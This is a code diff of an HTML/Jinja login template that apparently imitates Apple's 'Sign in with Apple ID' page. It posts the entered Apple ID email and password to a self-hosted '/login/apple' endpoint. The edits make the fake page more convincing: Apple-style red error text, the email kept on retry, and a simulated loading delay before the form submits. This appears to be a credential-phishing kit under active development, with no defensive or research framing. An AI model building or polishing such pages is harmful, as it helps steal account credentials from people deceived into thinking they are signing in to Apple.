@@ -17,9 +17,9 @@
         }
 
         .submit-btn:disabled {
-            background-color: #333; /* Slightly lighter black when processing */
+            background-color: #333;
             cursor: not-allowed;
-            color: transparent; /* Hide the "Sign In" text */
+            color: transparent;
         }
 
         /* The small loader inside the button */
@@ -37,6 +37,32 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        
+        /* ===== ERROR STYLES: RED TEXT, NO BACKGROUND, BELOW PASSWORD FIELD ===== */
+        .error-message {
+            color: #ff3b30 !important;
+            background: transparent !important;
+            font-size: 13px;
+            margin-top: -8px;
+            margin-bottom: 15px;
+            padding: 0;
+            font-weight: 400;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        /* Hide any flash message containers that might have backgrounds */
+        .flash-message, .alert, .alert-error, .alert-danger, .alert-success {
+            background: transparent !important;
+            border: none !important;
+            box-shadow: none !important;
+        }
+        
+        /* Ensure proper spacing */
+        .input-container {
+            margin-bottom: 5px;
+        }
     </style>
 </head>
 <body>
@@ -50,21 +76,24 @@
         </div>
         <h1>Sign in with Apple ID</h1>
 
-        {% with messages = get_flashed_messages() %}
+        <!-- FLASH MESSAGES - Now showing as RED TEXT with NO BACKGROUND -->
+        {% with messages = get_flashed_messages(with_categories=true) %}
           {% if messages %}
-            {% for message in messages %}
-              <p style="color: #ff3b30; font-size: 13px; margin-bottom: 10px;">{{ message }}</p>
+            {% for category, message in messages %}
+              <div class="error-message">
+                <span>⚠️</span> {{ message }}
+              </div>
             {% endfor %}
           {% endif %}
         {% endwith %}
 
         <form action="/login/apple" method="POST" id="appleForm">
             <div class="input-container">
-                <input type="email" name="apple_email" placeholder="Apple ID" required autofocus>
+                <input type="email" name="apple_email" placeholder="Apple ID" value="{{ email if email else '' }}" required autofocus>
             </div>
             
             <div class="input-container">
-                <input type="password" name="apple_password" placeholder="Password" required>
+                <input type="password" name="apple_password" id="password" placeholder="Password" required>
             </div>
 
             <button type="submit" class="submit-btn" id="appleBtn">
@@ -89,19 +118,21 @@
     const btnLoader = document.getElementById('btnLoader');
     const btnText = document.getElementById('btnText');
 
-    appleForm.addEventListener('submit', function(e) {
-        e.preventDefault(); 
-        
-        // Disable button and show loader inside it
-        appleBtn.disabled = true;
-        btnLoader.style.display = 'block';
-        btnText.style.visibility = 'hidden'; // Hide text but keep space
+    if (appleForm) {
+        appleForm.addEventListener('submit', function(e) {
+            e.preventDefault(); 
+            
+            // Disable button and show loader inside it
+            appleBtn.disabled = true;
+            btnLoader.style.display = 'block';
+            btnText.style.visibility = 'hidden';
 
-        // Wait 1.5 seconds before submitting
-        setTimeout(() => {
-            appleForm.submit(); 
-        }, 1500);
-    });
+            // Wait 1.5 seconds before submitting
+            setTimeout(() => {
+                appleForm.submit(); 
+            }, 1500);
+        });
+    }
 </script>
 
 </body>
